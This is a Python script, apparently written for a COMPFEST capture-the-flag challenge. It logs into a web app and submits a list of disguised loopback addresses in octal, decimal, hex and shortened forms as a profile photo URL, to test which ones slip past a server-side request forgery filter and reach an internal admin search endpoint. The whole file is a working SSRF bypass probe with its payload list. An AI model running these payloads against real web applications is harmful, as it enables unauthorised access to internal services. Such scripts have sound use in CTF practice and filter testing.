#!/usr/bin/env python3
import requests

# Target URL
BASE_URL = "http://ctf.compfest.id:7302"

def register_and_login():
    """Register a new user and login"""
    username = "test_private"
    password = "test123"
    
    # Register
    data = {'username': username, 'password': password}
    requests.post(f"{BASE_URL}/register", data=data)
    
    # Login
    response = requests.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    if response.status_code == 302:
        return response.cookies
    return None

def test_private_url():
    """Test if private URL check is blocking SSRF"""
    print("[+] Testing private URL bypass...")
    
    # Get session
    cookies = register_and_login()
    if not cookies:
        print("[-] Failed to login!")
        return
    
    print("[+] Successfully logged in!")
    
    # Test different URLs to see which ones get blocked
    test_urls = [
        "http://127.0.0.1:5000/internal/admin/search",
        "http://localhost:5000/internal/admin/search",
        "http://0.0.0.0:5000/internal/admin/search",
        "http://0177.0.0.1:5000/internal/admin/search",  # Octal
        "http://2130706433:5000/internal/admin/search",  # Decimal
        "http://0x7f.0x0.0x0.0x1:5000/internal/admin/search",  # Hex
        "http://017700000001:5000/internal/admin/search",  # Combined octal
        "http://127.1:5000/internal/admin/search",  # Shortened
        "http://127.0.1:5000/internal/admin/search",  # Alternative
        # Try some public URLs for comparison
        "http://httpbin.org/status/200",
        "https://httpbin.org/status/200",
    ]
    
    for url in test_urls:
        print(f"\n[*] Testing: {url}")
        
        data = {'photo_url': url}
        
        try:
            response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
            
            if response.status_code == 200:
                # Check for error messages
                if "Direct access to internal host is forbidden" in response.text:
                    print(f"[+] BLOCKED: {url}")
                elif "Failed to render as image" in response.text:
                    print(f"[+] ALLOWED (non-image): {url}")
                    
                    # Extract error preview
                    start = response.text.find("<pre>")
                    end = response.text.find("</pre>")
                    if start != -1 and end != -1:
                        preview = response.text[start+5:end]
                        print(f"[+] Error preview: {preview}")
                elif "profile-picture" in response.text:
                    print(f"[+] ALLOWED (image): {url}")
                else:
                    print(f"[+] UNKNOWN: {url}")
            else:
                print(f"[-] Error: {response.status_code}")
        
        except Exception as e:
            print(f"[-] Exception: {e}")

if __name__ == "__main__":
    test_private_url()
